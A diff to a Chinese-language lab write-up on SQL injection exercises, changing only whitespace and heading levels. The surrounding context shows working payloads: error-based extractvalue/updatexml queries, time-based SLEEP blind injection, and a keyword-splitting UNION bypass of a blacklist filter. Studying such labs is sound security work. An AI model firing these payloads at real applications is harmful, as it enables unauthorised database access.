@@ -87,7 +87,8 @@
     - `id=1  and (extractvalue(1,concat(0x7e,(select user()),0x7e)))`
         - extractvalue是mysql5.1提供的内置XML文件解析和修改函数，函数语法为extratvalue(XML_document,XPath_string),其中的XML_document是string格式，而当我们传入一个数值时，extractvalue()函数会产生报错；
     - `id=1  and (updatexml(1,concat(0x7e,(select user()),0x7e),1))`
-        - updatexml同样是mysql5.1中提供的内置xml文件解析和修改函数，函数语法为updatexml(XML_document,XPath_string,new_value),其中的XML_document是string格式，而当我们传入一个数值时，updatexml()函数会产生报错；
+        - updatexml同样是mysql5.1中提供的内置xml文件解析和修改函数，函数语法为updatexml(XML_document,XPath_string,new_value),其中的XML_document是string格式，而当我们传入一个数值时，updatexml()函数会产生报错；  
+
 
 ##<span id="SQL-5">SQL-5</span>
 虽然SQL-5的csql查询方式和SQL-1一样，但是php代码中没有对结果的输出点，而且注入布尔值判断也不影响页面正常输出任何内容，所以我们只能利用time-based blind。
@@ -97,7 +98,8 @@
 ###Payload
  - time-based blind 
     - `id=1 AND SLEEP(5) `
-    - `id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Kevinsa)`
+    - `id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))Kevinsa)`  
+
 
 ##<span id="SQL-6">SQL-6</span>
 SQL-6对比与SQL-1多了一层粗糙的过滤，`function sqlentities()`以黑名单的方式对id参数值进行过滤。
@@ -145,7 +147,7 @@ SQL-6对比与SQL-1多了一层粗糙的过滤，`function sqlentities()`以黑�
  - UNION query
     - `id=-3563 UNandION ALL SELECandT NULL,NULL,CONCAT()--`
 
-####<span id="SQL-8">SQL-8</span>
+##<span id="SQL-8">SQL-8</span>
 ###mysql_query
  - ```
    $name=$_POST['username'];  
